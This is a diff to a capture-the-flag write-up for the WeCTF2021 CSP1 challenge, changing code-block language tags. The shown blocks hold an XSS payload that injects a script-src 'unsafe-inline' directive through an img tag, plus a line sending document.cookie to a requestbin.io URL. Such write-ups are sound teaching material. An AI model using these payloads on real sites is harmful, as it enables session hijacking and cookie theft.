@@ -64,7 +64,7 @@ Now that we have a good idea of the exploit, let's craft it:
 
 ![](/assets/img/writeups/WeCTF2021/CSP1%20Writeup.002.png)
 
-```javascript
+```html
 <img src="http://; script-src 'unsafe-inline'"></img>
 <script>alert(1)</script>
 ```
@@ -81,7 +81,7 @@ Nice, so we've successfully exploited the vulnerability but the flag is actually
 
 ![](/assets/img/writeups/WeCTF2021/CSP1%20Writeup.004.png)
 
-```javascript
+```html
 <img src="http://; script-src 'unsafe-inline'"></img>
 <script>window.location = 'https://requestbin.io/1fy84do1?cookie=' + document.cookie;</script>
 ```
